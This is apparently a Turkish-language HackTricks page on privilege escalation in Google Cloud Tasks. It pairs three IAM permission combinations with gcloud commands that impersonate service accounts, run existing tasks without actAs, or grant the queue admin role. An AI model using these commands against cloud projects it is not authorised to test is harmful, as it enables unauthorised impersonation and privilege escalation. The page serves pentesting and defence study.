# GCP - Cloud Tasks Privesc

{{#include ../../../banners/hacktricks-training.md}}

## Cloud Tasks

### `cloudtasks.tasks.create`, `iam.serviceAccounts.actAs`

Bu izinlere sahip bir saldırgan, belirtilen service account kimliğiyle çalıştırılan görevler oluşturarak **diğer service account'ları taklit edebilir**. Bu, IAM korumalı Cloud Run veya Cloud Functions servislerine **kimlik doğrulanmış HTTP istekleri göndermeyi** sağlar.

<details><summary>Create Cloud Task with service account impersonation</summary>
```bash
gcloud tasks create-http-task \
task-$(date '+%Y%m%d%H%M%S') \
--location us-central1 \
--queue <queue_name> \
--url 'https://<service_name>.us-central1.run.app' \
--method POST \
--header 'X-Hello: world' \
--body-content '{"hello":"world"}' \
--oidc-service-account-email <account>@<project_id>.iam.gserviceaccount.com
```
</details>

### `cloudtasks.tasks.run`, `cloudtasks.tasks.list`

Bu izinlere sahip bir saldırgan, görevle ilişkili service account üzerinde izne sahip olmadan **mevcut zamanlanmış görevleri çalıştırabilir**. Bu, daha yüksek ayrıcalıklara sahip service account'larla daha önce oluşturulmuş görevleri çalıştırmayı sağlar.

<details><summary>Mevcut Cloud Task'ı actAs izni olmadan çalıştır</summary>
```bash
gcloud tasks run projects/<project_id>/locations/us-central1/queues/<queue_name>/tasks/<task_id>
```
</details>

Bu komutu çalıştıran principal'ın görev servis hesabı üzerinde **`iam.serviceAccounts.actAs` iznine ihtiyacı yoktur**. Ancak bu sadece mevcut görevleri çalıştırmaya izin verir — görev oluşturma veya değiştirme yetkisi vermez.

### `cloudtasks.queues.setIamPolicy`

Bu izne sahip bir saldırgan, belirli kuyruklarda kendisine veya diğer principal'lara **Cloud Tasks rolleri atayabilir**, potansiyel olarak `roles/cloudtasks.admin`'e yükselerek görev oluşturma ve çalıştırma yetkisini kazanabilir.

<details><summary>Kuyruğa Cloud Tasks admin rolü verme</summary>
```bash
gcloud tasks queues add-iam-policy-binding \
<queue_name> \
--location us-central1 \
--member serviceAccount:<account>@<project_id>.iam.gserviceaccount.com \
--role roles/cloudtasks.admin
```
</details>

Bu, saldırganın kontrol ettiği herhangi bir servis hesabına kuyruk üzerinde tam Cloud Tasks admin permissions vermesine olanak tanır.

## References

- [Google Cloud Tasks Documentation](https://cloud.google.com/tasks/docs)

{{#include ../../../banners/hacktricks-training.md}}
